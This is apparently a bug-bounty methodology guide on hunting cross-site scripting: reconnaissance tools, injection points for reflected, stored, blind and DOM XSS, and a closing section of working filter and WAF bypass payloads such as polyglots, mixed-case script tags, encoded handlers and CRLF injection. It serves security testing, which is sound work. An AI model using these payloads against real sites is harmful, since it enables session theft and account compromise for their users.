# **Comprehensive Guide to XSS Exploitation Techniques and Bypasses**

## **1. Reflected XSS Methods**
Reflected XSS attacks exploit vulnerabilities where user input is included in the response without proper sanitization. Below are some common approaches.

### **Mind Map for Reflected XSS**
An extensive mind map detailing approaches to reflected XSS can be found here:  
**[Reflected XSS Mindmap](https://github.com/A9HORA/Reflected-XSS-Mindmap)** by **[@A9HORA](https://twitter.com/A9HORA)**.

### **1.1 Using Burp Suite**
1. Install the **Reflection** and **Sentinel** plugins for Burp Suite.
2. Walk and spider the target site.
3. Inspect the **reflected parameters** tab in Burp.
4. Send parameters to **Sentinel** for automated analysis or verify manually.

### **1.2 Using WaybackURLs and Similar Tools**
1. Use **[Gau](https://github.com/lc/gau)** or **[WaybackURLs](https://github.com/tomnomnom/waybackurls)** to collect URLs.
2. Filter parameters using `grep "="` or **GF patterns** and store them in a file.
3. Run **[Gxss](https://github.com/KathanP19/Gxss)** or **[Bxss](https://github.com/ethicalhackingplayground/bxss/)** on the file.
4. Manually inspect reflected parameters or use **[Dalfox](https://github.com/hahwul/dalfox)**.

### **1.3 Using Google Dorks**
1. Use Google Dork: `site:target.com`
2. Find links with parameters using dorks such as:
   - `site:target.com inurl:".php?"`
   - `site:target.com filetype:php`
   - **More dorks:** [Top 100 XSS Dorks](https://www.openbugbounty.org/blog/devl00p/top-100-xss-dorks/)
3. Check if parameters are reflected in HTML.
4. Inject XSS payloads or test with automated tools.

### **1.4 Finding Hidden Variables in Source Code**
1. Inspect JavaScript and HTML source files for hidden parameters.
2. Search manually in **Page Source** for:
   - `var=`
   - `=""`
   - `=''`
3. Append discovered parameters to URLs, e.g.,  
   `https://example.com?hiddenvariablename=xss`

### **1.5 Other Techniques**
1. Use **Methods 1 or 2** to gather URLs.
2. Identify the **firewall** using [WhatWaf](https://github.com/Ekultek/WhatWaf).
3. Find WAF bypass payloads:
   - Twitter search
   - [Awesome WAF Bypass](https://github.com/0xInfection/Awesome-WAF)
4. Use **[Arjun](https://github.com/s0md3v/Arjun)** to discover hidden parameters.

### **Additional Tips**
- Examine **error pages (404, 403, etc.)** for reflected values.
- Trigger a **403 error** by requesting the `.htaccess` file.
- Test **all reflected parameters** for XSS.

### **Video References**
- [Reflected XSS Automation](https://www.youtube.com/watch?v=wuyAY3vvd9s)
- [Practical XSS Hunting](https://www.youtube.com/watch?v=GsyOuQBG2yM)

---

## **2. Stored XSS Methods**
Stored XSS occurs when malicious scripts are permanently stored on the target website.

### **Steps for Detecting Stored XSS**
1. Enumerate the firewall and identify WAF rules.
2. Test payloads in fields such as:
   - **Username**
   - **Address**
   - **Email**
3. Inject payloads in **profile picture filenames** and metadata.
4. Attempt injections in **comments, reviews, and feedback sections**.
5. Try **every input field** that reflects data to other users.
6. Register an account with an XSS payload in the **name field**.

### **Additional Tips**
- Test entity injection with:
  ```html
  <a href=#>test</a>
  ```
- If any payload is executed, refine and escalate the attack.

### **Write-Up Reference**
- [How I Found My First Stored XSS](https://medium.com/@fatin151485/how-i-found-my-first-stored-xss-on-popular-eboighar-com-6bd497b0bb96)

---

## **3. Blind XSS**
Blind XSS occurs when the payload does not immediately reflect, but executes later in backend systems or admin panels.

### **Detection Techniques**
1. Inject payloads that call back to a **listener** on your server.
2. Use:
   - **[XSS Hunter](https://xsshunter.com/)**
   - **Burp Collaborator**
   - **Ngrok** for receiving callbacks.
3. Test injection points such as:
   - **Contact forms**
   - **Admin dashboards**
   - **User input logs**
   - **E-commerce checkout fields**

### **Common Injection Points**
- **Review and feedback forms**
- **Address fields in e-commerce sites**
- **User-Agent headers**
- **Log viewers**
- **Chat applications**
- **Moderation panels**

### **Video References**
- [Blind XSS Hunting](https://www.youtube.com/watch?v=uHy1x1NkwRU)

---

## **4. DOM-Based XSS**
DOM XSS occurs when JavaScript dynamically manipulates the page without sanitizing user input.

### **Tips**
- Manual detection is difficult; use tools like:
  - **Burp Suite PRO**
  - **[RA2 DOM XSS Scanner](https://github.com/dpnishant/ra2-dom-xss-scanner)**

### **Video References**
- [Understanding DOM XSS](https://www.youtube.com/watch?v=gBqzzhgHoYg)

---

## **5. XSS Filter Evasion Techniques**
### **General Bypass Techniques**
- Replace `<` and `>` with **HTML entities**:
  ```html
  &lt;script&gt;alert(1)&lt;/script&gt;
  ```
- Use **XSS polyglots**:
  ```html
  javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
  ```
  - [Full XSS Polyglots List](https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626)

### **XSS Firewall Bypass**
- **Bypass lowercase filtering**:
  ```html
  <scRipT>alert(1)</scRipT>
  ```
- **Break firewall regex using new lines**:
  ```html
  <script>%0alert(1)</script>
  ```
- **Double Encoding**:
  ```plaintext
  %2522
  ```
- **Recursive filters bypass**:
  ```html
  <src<script>ipt>alert(1);</scr</script>ipt>
  ```
- **Injecting anchor tags without whitespace**:
  ```html
  <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
  ```
- **Bypassing whitespace filtering using a bullet (`•`)**:
  ```html
  <svg•onload=alert(1)>
  ```
- **Changing request methods**:
  ```
  GET /?q=xss  
  POST / q=xss
  ```
- **Injecting CRLF characters for HTTP response splitting**:
  ```
  GET /%0A%0DValue=%20Virus
  ```

---

## **Acknowledgments and References**
### **Special Thanks**
- **[The XSS Rat](https://www.youtube.com/channel/UCjBhClJ59W4hfUly51i11hg)**
- **[@sratarun](https://twitter.com/sratarun)**

### **References**
- **[Hunting Checklist](https://github.com/heilla/SecurityTesting/blob/master/HuntingCheckList.md)**

### **Authors**
- **[@KathanP19](https://twitter.com/KathanP19)**
- **[@harsha0x01](https://twitter.com/harsha0x01)**

---
*Enhanced and reformatted for HowToHunt repository by [remonsec](https://x.com/remonsec)*
